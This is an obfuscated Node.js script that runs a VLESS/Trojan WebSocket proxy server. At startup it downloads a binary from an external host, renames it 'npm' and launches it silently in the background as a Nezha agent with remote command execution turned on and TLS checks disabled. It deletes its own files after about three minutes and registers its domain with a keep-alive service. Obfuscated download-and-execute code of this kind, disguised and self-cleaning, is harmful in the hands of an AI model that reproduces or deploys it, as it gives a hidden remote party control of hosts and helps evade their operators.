(function(_0x47e4ef,_0x2e6ac2){const _0x1066cd={_0x4e285a:0xb5,_0x14b0f2:0xe2,_0x283d9e:0xeb,_0x9ce156:0xf8,_0x3d45ed:0xca,_0x520936:0xc5},_0x5cf676=_0x1e1e,_0x12cd88=_0x47e4ef();while(!![]){try{const _0x10d8d5=parseInt(_0x5cf676(_0x1066cd._0x4e285a))/0x1*(-parseInt(_0x5cf676(0xf7))/0x2)+parseInt(_0x5cf676(0xf4))/0x3*(parseInt(_0x5cf676(0xcb))/0x4)+parseInt(_0x5cf676(_0x1066cd._0x14b0f2))/0x5+-parseInt(_0x5cf676(_0x1066cd._0x283d9e))/0x6*(parseInt(_0x5cf676(0xbc))/0x7)+-parseInt(_0x5cf676(_0x1066cd._0x9ce156))/0x8*(parseInt(_0x5cf676(0xee))/0x9)+parseInt(_0x5cf676(0xc0))/0xa+parseInt(_0x5cf676(_0x1066cd._0x3d45ed))/0xb*(-parseInt(_0x5cf676(_0x1066cd._0x520936))/0xc);if(_0x10d8d5===_0x2e6ac2)break;else _0x12cd88['push'](_0x12cd88['shift']());}catch(_0x1e1c46){_0x12cd88['push'](_0x12cd88['shift']());}}}(_0x4713,0xeb379));function handleTrojanConnection(_0xefb33e,_0x94c1b3){const _0x5875a8={_0x2aee5a:0xf3,_0x381f35:0xc2,_0x1699df:0xe3,_0x6cd8e7:0xde,_0x49cca7:0xd2},_0x5b59da={_0x57ca90:0xdb},_0x41af27={_0x2074cb:0xc2,_0xe67d56:0xb2},_0x45a2b1={_0x5461b6:0xf2},_0x332633=_0x1e1e;try{if(_0x94c1b3[_0x332633(0xd2)]<0x3a)return![];const _0x300adb=_0x94c1b3[_0x332633(0xc2)](0x0,0x38)[_0x332633(0xd8)](),_0x15fd5f=[UUID];let _0x573f02=null;for(const _0x397eac of _0x15fd5f){const _0x3aa213=crypto['createHash']('sha224')['update'](_0x397eac)[_0x332633(_0x5875a8._0x2aee5a)](_0x332633(0xc4));if(_0x3aa213===_0x300adb){_0x573f02=_0x397eac;break;}}if(!_0x573f02)return![];let _0x397507=0x38;_0x94c1b3[_0x397507]===0xd&&_0x94c1b3[_0x397507+0x1]===0xa&&(_0x397507+=0x2);const _0x579432=_0x94c1b3[_0x397507];if(_0x579432!==0x1)return![];_0x397507+=0x1;const _0x3aaf6d=_0x94c1b3[_0x397507];_0x397507+=0x1;let _0x532b81,_0x35becc;if(_0x3aaf6d===0x1)_0x532b81=_0x94c1b3[_0x332633(_0x5875a8._0x381f35)](_0x397507,_0x397507+0x4)[_0x332633(0xde)]('.'),_0x397507+=0x4;else{if(_0x3aaf6d===0x3){const _0x33a018=_0x94c1b3[_0x397507];_0x397507+=0x1,_0x532b81=_0x94c1b3[_0x332633(0xc2)](_0x397507,_0x397507+_0x33a018)['toString'](),_0x397507+=_0x33a018;}else{if(_0x3aaf6d===0x4)_0x532b81=_0x94c1b3[_0x332633(_0x5875a8._0x381f35)](_0x397507,_0x397507+0x10)[_0x332633(_0x5875a8._0x1699df)]((_0x459751,_0x4fc5a8,_0x4ab84a,_0x551d75)=>_0x4ab84a%0x2?_0x459751[_0x332633(0xf0)](_0x551d75[_0x332633(0xc2)](_0x4ab84a-0x1,_0x4ab84a+0x1)):_0x459751,[])[_0x332633(0xf9)](_0x4bee71=>_0x4bee71[_0x332633(0xbb)](0x0)[_0x332633(0xd8)](0x10))[_0x332633(_0x5875a8._0x6cd8e7)](':'),_0x397507+=0x10;else return![];}}_0x35becc=_0x94c1b3['readUInt16BE'](_0x397507),_0x397507+=0x2;_0x397507<_0x94c1b3[_0x332633(_0x5875a8._0x49cca7)]&&_0x94c1b3[_0x397507]===0xd&&_0x94c1b3[_0x397507+0x1]===0xa&&(_0x397507+=0x2);const _0x4c9c72=createWebSocketStream(_0xefb33e);return resolveHost(_0x532b81)[_0x332633(0xba)](_0x58648d=>{const _0x3b695e={_0x17a11d:0xdb},_0x5eb8d0=_0x332633;net[_0x5eb8d0(_0x45a2b1._0x5461b6)]({'host':_0x58648d,'port':_0x35becc},function(){const _0x55c765=_0x5eb8d0;_0x397507<_0x94c1b3[_0x55c765(0xd2)]&&this[_0x55c765(0xe8)](_0x94c1b3[_0x55c765(0xc2)](_0x397507)),_0x4c9c72['on'](_0x55c765(0xdb),()=>{})[_0x55c765(0xb2)](this)['on'](_0x55c765(_0x3b695e._0x17a11d),()=>{})[_0x55c765(0xb2)](_0x4c9c72);})['on'](_0x5eb8d0(0xdb),()=>{});})[_0x332633(0xd5)](_0xeb96f5=>{const _0xa3d274=_0x332633;net[_0xa3d274(0xf2)]({'host':_0x532b81,'port':_0x35becc},function(){const _0x2946a7=_0xa3d274;_0x397507<_0x94c1b3[_0x2946a7(0xd2)]&&this[_0x2946a7(0xe8)](_0x94c1b3[_0x2946a7(_0x41af27._0x2074cb)](_0x397507)),_0x4c9c72['on'](_0x2946a7(0xdb),()=>{})[_0x2946a7(_0x41af27._0xe67d56)](this)['on']('error',()=>{})[_0x2946a7(_0x41af27._0xe67d56)](_0x4c9c72);})['on'](_0xa3d274(_0x5b59da._0x57ca90),()=>{});}),!![];}catch(_0x10a998){return![];}}wss['on']('connection',(_0x3945fc,_0x283bea)=>{const _0x3f868f={_0x5367ce:0xdb},_0xeb553a={_0x4657b8:0xd2,_0x44aa97:0xd3},_0xc74f56=_0x1e1e,_0x32160f=_0x283bea[_0xc74f56(0xd9)]||'';_0x3945fc['once'](_0xc74f56(0xd7),_0x3d038f=>{const _0x402f8b=_0xc74f56;if(_0x3d038f[_0x402f8b(_0xeb553a._0x4657b8)]>0x11&&_0x3d038f[0x0]===0x0){const _0x5c2bbc=_0x3d038f[_0x402f8b(0xc2)](0x1,0x11),_0x135c26=_0x5c2bbc['every']((_0x1a42af,_0x11c2ab)=>_0x1a42af==parseInt(uuid['substr'](_0x11c2ab*0x2,0x2),0x10));if(_0x135c26){!handleVlessConnection(_0x3945fc,_0x3d038f)&&_0x3945fc[_0x402f8b(_0xeb553a._0x44aa97)]();return;}}!handleTrojanConnection(_0x3945fc,_0x3d038f)&&_0x3945fc[_0x402f8b(0xd3)]();})['on'](_0xc74f56(_0x3f868f._0x5367ce),()=>{});});const getDownloadUrl=()=>{const _0x529229={_0x5c460a:0xe9},_0x3e74bf=_0x1e1e,_0x179618=os[_0x3e74bf(0xd4)]();return _0x179618===_0x3e74bf(0xf5)||_0x179618===_0x3e74bf(0xcc)||_0x179618===_0x3e74bf(0xd0)?!NEZHA_PORT?_0x3e74bf(0xb8):_0x3e74bf(_0x529229._0x5c460a):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x2e3b38={_0x2c0f2d:0xf1},_0x165477={_0x105eb5:0xb4},_0x1d1715=_0x1e1e;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x1aae65=getDownloadUrl(),_0x4dea84=await axios({'method':_0x1d1715(0xda),'url':_0x1aae65,'responseType':_0x1d1715(0xb6)}),_0x4a9786=fs[_0x1d1715(0xc7)](_0x1d1715(_0x2e3b38._0x2c0f2d));return _0x4dea84[_0x1d1715(0xb1)]['pipe'](_0x4a9786),new Promise((_0x52045a,_0x2f9a51)=>{const _0x30d3ec=_0x1d1715;_0x4a9786['on']('finish',()=>{const _0x16f341=_0x1e1e;console[_0x16f341(_0x165477._0x105eb5)]('npm\x20download\x20successfully'),exec(_0x16f341(0xc1),_0x4ca626=>{if(_0x4ca626)_0x2f9a51(_0x4ca626);_0x52045a();});}),_0x4a9786['on'](_0x30d3ec(0xdb),_0x2f9a51);});}catch(_0x52ea5d){throw _0x52ea5d;}},runnz=async()=>{const _0x318b54={_0x398bfb:0xf6,_0x7cde3e:0xec,_0xb7ca1e:0xb7,_0xd77b5c:0xed,_0x3e8637:0xe6,_0x9ed307:0xe0},_0x4c15d6={_0x4ccb1c:0xb4},_0x1127f9=_0x1e1e;try{const _0x5aa978=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x1127f9(0xef)});if(_0x5aa978[_0x1127f9(0xdc)]()!==''){console[_0x1127f9(0xb4)](_0x1127f9(0xcf));return;}}catch(_0x5956b2){}await downloadFile();let _0x3b5f41='',_0x371abb=[_0x1127f9(0xc8),_0x1127f9(0xe1),_0x1127f9(0xe4),_0x1127f9(0xdf),'2083',_0x1127f9(_0x318b54._0x398bfb)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x4e2f31=_0x371abb[_0x1127f9(0xb7)](NEZHA_PORT)?'--tls':'';_0x3b5f41='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x1127f9(0xd6)+NEZHA_KEY+'\x20'+_0x4e2f31+_0x1127f9(_0x318b54._0x7cde3e);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3fd216=NEZHA_SERVER[_0x1127f9(_0x318b54._0xb7ca1e)](':')?NEZHA_SERVER['split'](':')[_0x1127f9(0xea)]():'',_0x2efca3=_0x371abb[_0x1127f9(0xb7)](_0x3fd216)?'true':_0x1127f9(0xb9),_0x21c9f4=_0x1127f9(0xc3)+NEZHA_KEY+_0x1127f9(0xe7)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x2efca3+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x1127f9(_0x318b54._0xd77b5c)](_0x1127f9(_0x318b54._0x3e8637),_0x21c9f4);}_0x3b5f41=_0x1127f9(0xd1);}else{console['log']('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x3b5f41,{'shell':_0x1127f9(0xcd)},_0x370ee7=>{const _0x53a56a=_0x1127f9;if(_0x370ee7)console[_0x53a56a(0xdb)](_0x53a56a(0xbe),_0x370ee7);else console[_0x53a56a(_0x4c15d6._0x4ccb1c)](_0x53a56a(0xce));});}catch(_0x417253){console[_0x1127f9(0xdb)](_0x1127f9(_0x318b54._0x9ed307)+_0x417253);}};async function addAccessTask(){const _0x156037={_0x3027d7:0xb3,_0x476e3d:0xbd,_0x9f60a2:0xb4},_0x364629=_0x1e1e;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x47d0db=_0x364629(0xbf)+DOMAIN;try{const _0x41b5a3=await axios[_0x364629(_0x156037._0x3027d7)](_0x364629(0xc6),{'url':_0x47d0db},{'headers':{'Content-Type':_0x364629(_0x156037._0x476e3d)}});console[_0x364629(_0x156037._0x9f60a2)](_0x364629(0xdd));}catch(_0x5d3287){}}function _0x1e1e(_0x4d51d6,_0x458d8a){const _0x471354=_0x4713();return _0x1e1e=function(_0x1e1eaa,_0xc0792d){_0x1e1eaa=_0x1e1eaa-0xb1;let _0x123444=_0x471354[_0x1e1eaa];return _0x123444;},_0x1e1e(_0x4d51d6,_0x458d8a);}const delFiles=()=>{const _0x1d1651={_0x1da0f1:0xf1,_0x21adb8:0xe6},_0x111a50=_0x1e1e;fs['unlink'](_0x111a50(_0x1d1651._0x1da0f1),()=>{}),fs[_0x111a50(0xc9)](_0x111a50(_0x1d1651._0x21adb8),()=>{});};httpServer['listen'](PORT,()=>{const _0x44faec={_0x520a2a:0xe5},_0x8495b7=_0x1e1e;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x8495b7(_0x44faec._0x520a2a)+PORT);});function _0x4713(){const _0x137a5c=['toString','url','get','error','trim','Automatic\x20Access\x20Task\x20added\x20successfully','join','2087','error:\x20','8443','9358970jiuEgJ','reduce','2096','Server\x20is\x20running\x20on\x20port\x20','config.yaml','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','write','https://arm64.ssss.nyc.mn/agent','pop','11898Kcbffn','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','writeFileSync','33381UyufPM','utf-8','concat','npm','connect','digest','12Amgcce','arm','2053','239092VFIMJD','248Uvwkae','map','data','pipe','post','log','1yiRWmO','stream','includes','https://arm64.ssss.nyc.mn/v1','false','then','readUInt16BE','3248mcJVgB','application/json','npm\x20running\x20error:','https://','17866480pzRVWL','chmod\x20+x\x20npm','slice','client_secret:\x20','hex','36BmNFbp','https://oooo.serv00.net/add-url','createWriteStream','443','unlink','11658812agUCPu','1639320IoToRA','arm64','/bin/bash','npm\x20is\x20running','npm\x20is\x20already\x20running,\x20skip\x20running...','aarch64','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','length','close','arch','catch','\x20-p\x20','message'];_0x4713=function(){return _0x137a5c;};return _0x4713();}
